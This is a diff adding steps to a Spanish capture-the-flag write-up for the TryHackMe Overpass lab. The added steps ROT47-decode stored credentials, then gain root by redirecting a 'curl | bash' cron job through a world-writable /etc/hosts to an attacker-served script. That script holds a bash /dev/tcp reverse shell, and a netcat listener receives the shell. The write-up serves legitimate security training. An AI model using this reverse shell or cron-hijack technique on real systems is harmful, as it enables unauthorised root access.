@@ -7,7 +7,6 @@ Enlace Maquina: https://tryhackme.com/room/overpass
 Enunciado : 
 
   - Conseguir Flags(user.txt y root.txt)
-  - BONUS --> Conseguir codigo de subscripcion.
 ---
 
 ## Escaneo de puertos (NMAP).
@@ -206,15 +205,124 @@ Nos pide passphrase para la id_rsa, cosa que no tenemos.
 	> Ask Paradox how he got the automated build script working and where the builds go.
 	  They're not updating on the website
 
-- Encontramos interesante los dos ultimos comentarios.
+- Nos llama la atencion los dos ultimos comentarios.
 
-	1)El binario para macOS se crea bien pero no esta seguro de si funciona, podriamos ver el codigo fuente que lo tenemos disponible en la web.
-  
-	2)Pregunta al usuario Paradox donde estan los scripts automaticos de actualizacion web, podrian tener una tarea programada corriendo.
+	1) El binario para macOS se crea bien pero no esta seguro de si funciona, podriamos ver el codigo fuente que lo tenemos disponible en la web.
 
-  
+		- Descargamos de la web el fichero overpass.go(Downloads->SourceCode) y despues de analizarlo encotramos.
+				
+				//Secure encryption algorithm
+				func rot47(input string) string {...
 
-  
+				//.overpass, fichero del cual carga las credenciales, se encuentra oculto en el home del usuario.
+				    func main() {
+				        credsPath, err := homedir.Expand("~/.overpass")
+				        if err != nil {
+				                fmt.Println("Error finding home path:", err.Error())
+				        }
+				        //Load credentials
+				        passlist, status := loadCredsFromFile(credsPath)
+    
+		- Sabiendo esto obtenemos credenciales utilizamos CyberChef
+
+				james@overpass-prod:~$ cat .overpass 
+				,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+
+			![image](https://github.com/Esevka/CTF/assets/139042999/185325a7-62be-47ed-a757-81c2f3c13ee3)
+
+  			Utiliamos la clave para ejecutar dicho comando, a ver si cuela.
+    	
+    	 			//Listamos los comandos permitidos y prohibidos para el usuario que invoca en el host actual.
+
+    				james@overpass-prod:~$ sudo -l
+				[sudo] password for james: 
+				Sorry, user james may not run sudo on overpass-prod.
+    
+    	--Por aqui ya no encontramos nada mas--
+
+	2) Pregunta al usuario Paradox donde estan los scripts automaticos de actualizacion web, podrian tener una tarea programada corriendo.
+
+  		- Listamos las tareas programadas y vemos que ejecuta la tarea cada minuto, 
+
+  			![image](https://github.com/Esevka/CTF/assets/139042999/b1e25e43-334e-48e5-b749-68723e2ac74d)
+
+   			![image](https://github.com/Esevka/CTF/assets/139042999/73303828-0e7c-4eed-a39d-41fff24882c1)
+
+  				Que hace la tarea programada?
+      				Mediante curl realiza una peticion a un fichero bash script(que posee un codigo a ejecutar) para obtener su contenido,
+      				posteriormente la salida de curl se la pasa a bash para que ejecute dicho contenido.
+ 
+    				Vemos en la url que esto va a un dominio 'overpass.thm', podriamos intentar editar el fichero etc/hosts de la maquina victima
+      				y redireccionar dicho dominio a nuestra ip, posteriormente montaremos un servidor http y ofreceremos el fichero 'buildscript.sh'
+      				modificado por nosotros para que ejecute nuestro codigo a nivel de root.
+			
+		- Miramos si tenemos permisos para editar /etc/hosts
+
+				/////Tenemos permisos para editar
+				james@overpass-prod:~$ ls -la /etc/hosts
+				-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
+
+				//////Fichero editado, establecemos nuestra ip como resolucion del dominio.
+				james@overpass-prod:~$ cat /etc/hosts
+				127.0.0.1 localhost
+				127.0.1.1 overpass-prod
+				10.9.92.151 overpass.thm ---> Aqui establecemos nuestra IP
+				....
+
+  		- Vamos a crear un fichero llamado buildscript.sh(contiene una reverse shell), para que cuando se ejecute la tarea programada obtengamos una shell como usuario root.
+
+				┌──(root㉿kali)-[/home/…/overpass/files/downloads/src]
+				└─# touch buildscript.sh                                              
+				                                                                                                                                                           
+				┌──(root㉿kali)-[/home/…/overpass/files/downloads/src]
+				└─# echo '/bin/bash -i >& /dev/tcp/10.9.92.151/1988 0>&1' > buildscript.sh
+
+		- Montamos nuestro servidor http y obtenemos acceso como root.
+   
+			El servidor lo montamos en el directorio files por ejemplo, pero dentro de files debe tener la siguiente estructura --> Downloads/src/buildscript.sh
+
+				┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+				└─# python3 -m http.server 80
+				Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+    		
+			Nos ponemos en escucha para recibir la reverse shell y esperamos que la tarea programada se ejecute.
+
+				//Nos ponemos en escucha
+    
+				──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+				└─# rlwrap nc -lnvp 1988
+				listening on [any] 1988 ...
+   
+    
+				///Vemos que se ha realizado una peticion por GET  a nuestro servidor y se ha resuelto correctamente.
+    
+				┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+				└─# python3 -m http.server 80
+				Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+				10.10.124.183 - - [14/Nov/2023 07:25:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
+
+
+				///Obtenemos Shell como usuario Root
+
+				──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
+				└─# rlwrap nc -lnvp 1988
+				listening on [any] 1988 ...
+				connect to [10.9.92.151] from (UNKNOWN) [10.10.124.183] 36962
+				bash: cannot set terminal process group (17174): Inappropriate ioctl for device
+				bash: no job control in this shell
+				root@overpass-prod:~# 
+
+
+    		Leemos flag root.txt
+
+				root@overpass-prod:~# cat root.txt
+				cat root.txt
+				thm{7f336f8c359d-------d54fdd64ea753bb}
+
+    
+
+    	
 
 
 
